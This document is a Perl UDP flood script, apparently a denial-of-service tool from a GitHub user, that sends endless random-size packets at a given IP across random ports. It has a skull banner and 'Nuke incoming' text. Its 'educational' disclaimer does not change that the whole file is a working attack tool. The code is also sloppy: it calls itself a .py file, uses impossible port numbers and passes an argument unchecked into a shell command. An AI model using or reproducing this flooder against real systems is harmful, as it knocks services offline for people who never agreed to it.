#!/usr/bin/perl

# DISCLAIMER
#
# This script is intended for educational and research purposes only.
# It is designed to simulate UDP network traffic and demonstrate
# potential effects of network stress testing. This script is not
# intended for malicious use or to cause harm to any network or system.

# perl scoxfield.py <target_ip> <target_port> <duration>

use Socket;

my ($ip,$port,$size,$time);
    $ip=$ARGV[0];
    $port=$ARGV[1];
    $time=$ARGV[2];
socket(flood, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$ip") or die "perl scoxfield.py <target_ip> <target_port> <duration>' \n";
printf "\033[0;32m >>☢Nuke incoming☢<< !!!\n" unless $time;
printf "\033[0;32m >>☣github.com/scoxfield☣<< \n" unless $time;
printf "\033[0;32m           .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             ' \n" unless $time;                
if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &"); 
goto randpackets;
}
packets:65500;
for (;;) {
    $size=$rand x $rand x $rand;
    $port=int(rand 95500) +0;
    $psize = $size ? $size : int(rand(95750-64)+1) ;
    $pport = $port ? $port : int(rand(959900))+1;
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
}
randpackets:65500;
for (;;) {
    $size=$rand x $rand x $rand;
    $port=int(rand 65550) +1;
    $psize = $size ? $size : int(rand(95750-64)+1) ;
    $pport = $port ? $port : int(rand(959900))+1;
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
}
